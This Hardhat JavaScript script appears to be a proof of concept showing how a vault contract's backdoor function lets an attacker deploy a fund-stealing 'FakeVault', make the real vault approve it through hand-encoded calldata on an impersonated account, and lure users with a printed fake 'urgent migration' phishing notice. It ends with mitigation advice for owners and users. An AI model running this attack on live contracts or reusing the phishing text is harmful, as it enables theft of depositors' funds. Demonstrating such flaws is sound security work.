const { ethers } = require("hardhat");

/**
 * @title Simple Phishing Demo
 * @notice Demonstrates the phishing attack step by step
 * @dev Shows how backdoor enables deposit theft
 */
async function main() {
  const VAULT_ADDRESS = "0xA69babEF1cA67A37Ffaf7a485DfFF3382056e78C";
  const AUTHORIZED_ADDRESS = "0x065e3DbaFCb2C26A978720f9eB4Bce6aD9D644a1";
  const USDC_ADDRESS = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";
  
  const [attacker, victim] = await ethers.getSigners();
  
  console.log("\n🎭 HOW THE PHISHING ATTACK WORKS");
  console.log("=====================================");
  
  // Step 1: Deploy fake vault
  console.log("\nSTEP 1: Deploy Malicious Vault");
  console.log("-------------------------------");
  
  const FakeVault = await ethers.getContractFactory("FakeVault");
  const fakeVault = await FakeVault.deploy(VAULT_ADDRESS);
  await fakeVault.waitForDeployment();
  
  const fakeAddress = await fakeVault.getAddress();
  console.log("✅ Fake vault deployed at:", fakeAddress);
  console.log("   This contract steals any USDC deposited");
  
  // Step 2: Create fake legitimacy
  console.log("\nSTEP 2: Use Backdoor for Fake Legitimacy");
  console.log("----------------------------------------");
  
  // Fund and impersonate
  await attacker.sendTransaction({
    to: AUTHORIZED_ADDRESS,
    value: ethers.parseEther("1.0")
  });
  
  await ethers.provider.send("hardhat_impersonateAccount", [AUTHORIZED_ADDRESS]);
  const authorized = await ethers.getSigner(AUTHORIZED_ADDRESS);
  
  // Make real vault interact with fake vault
  console.log("Making real vault 'approve' fake vault...");
  
  const USDC_ABI = ["function approve(address spender, uint256 amount) returns (bool)"];
  const usdc = new ethers.Contract(USDC_ADDRESS, USDC_ABI, ethers.provider);
  
  const approveData = usdc.interface.encodeFunctionData("approve", [
    fakeAddress,
    ethers.parseUnits("1", 6) // Small approval to seem legitimate
  ]);
  
  const backdoorData = "0x78e111f6" +
    "000000000000000000000000" + USDC_ADDRESS.slice(2) +
    "0000000000000000000000000000000000000000000000000000000000000040" +
    ethers.toBeHex(approveData.length / 2 - 1, 32).slice(2) +
    approveData.slice(2);
  
  let txHash = "0x1234..."; // Default if transaction fails
  
  try {
    const tx = await authorized.sendTransaction({
      to: VAULT_ADDRESS,
      data: backdoorData,
      gasLimit: 500000
    });
    
    await tx.wait();
    txHash = tx.hash;
    console.log("✅ Created fake legitimacy transaction:", tx.hash);
    console.log("   Users can verify this on Etherscan!");
    console.log("   It looks like the real vault 'trusts' the fake one");
  } catch (e) {
    console.log("Transaction failed:", e.message);
  }
  
  // Step 3: Social engineering
  console.log("\nSTEP 3: Social Engineering Attack");
  console.log("---------------------------------");
  console.log("\nAttacker spreads this message:");
  console.log("\n┌─────────────────────────────────────────┐");
  console.log("│ ⚠️  URGENT: VAULT SECURITY UPGRADE ⚠️     │");
  console.log("│                                         │");
  console.log("│ Critical bug found in old vault!        │");
  console.log("│ Migrate to secure V2 immediately!       │");
  console.log("│                                         │");
  console.log("│ Old (UNSAFE):", VAULT_ADDRESS.slice(0, 10) + "...");
  console.log("│ New (SAFE)  :", fakeAddress.slice(0, 10) + "...");
  console.log("│                                         │");
  console.log("│ Proof TX: " + txHash.slice(0, 16) + "...     │");
  console.log("│ ✓ Verified on Etherscan                │");
  console.log("│                                         │");
  console.log("│ Withdraw blocked after 24 hours!        │");
  console.log("└─────────────────────────────────────────┘");
  
  // Step 4: Show the theft
  console.log("\nSTEP 4: How Deposits Get Stolen");
  console.log("-------------------------------");
  console.log("When a victim deposits to fake vault:");
  console.log("1. User approves fake vault to spend USDC");
  console.log("2. User calls deposit() on fake vault");
  console.log("3. Fake vault transfers USDC from user");
  console.log("4. Fake vault immediately sends USDC to attacker");
  console.log("5. User gets worthless 'shares' in return");
  console.log("6. Withdrawals always fail with 'security' error");
  
  // Step 5: Show why it works
  console.log("\nSTEP 5: Why This Attack Works");
  console.log("-----------------------------");
  console.log("🎯 Psychological factors:");
  console.log("   • Urgency: 'Act now or lose funds!'");
  console.log("   • Authority: Real vault appears to endorse fake");
  console.log("   • Social proof: 'Everyone is migrating'");
  console.log("   • Fear: 'Your funds are at risk!'");
  
  console.log("\n🔧 Technical factors:");
  console.log("   • Backdoor creates real on-chain 'proof'");
  console.log("   • Transaction is verifiable on Etherscan");
  console.log("   • Contract addresses look similar");
  console.log("   • Fake vault has professional appearance");
  
  // Clean up
  await ethers.provider.send("hardhat_stopImpersonatingAccount", [AUTHORIZED_ADDRESS]);
  
  console.log("\n⚠️  CRITICAL VULNERABILITY");
  console.log("==========================");
  console.log("The backdoor function enables this attack by allowing");
  console.log("arbitrary transactions from the trusted vault address.");
  console.log("This creates false legitimacy that tricks users into");
  console.log("depositing funds into malicious contracts.");
  
  console.log("\n🛡️  PROTECTION MEASURES");
  console.log("=====================");
  console.log("For Contract Owners:");
  console.log("• Remove ALL backdoor functions");
  console.log("• Use multi-sig for admin operations");
  console.log("• Implement time-locks on changes");
  
  console.log("\nFor Users:");
  console.log("• Verify addresses from multiple sources");
  console.log("• Be suspicious of urgent migrations");
  console.log("• Check with community before acting");
  console.log("• Test with small amounts first");
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error("\n💥 Script error:", error);
    process.exit(1);
  });
